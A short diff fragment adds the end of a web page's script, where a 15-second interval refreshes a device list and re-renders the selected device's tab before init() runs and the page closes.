+    refreshDevices();
+    if (selectedDevice && document.getElementById('tabContent')) {
+      renderTab(currentTab);
+    }
+  }
+}, 15000);
+
+init();
+</script>
+</body>
+</html>
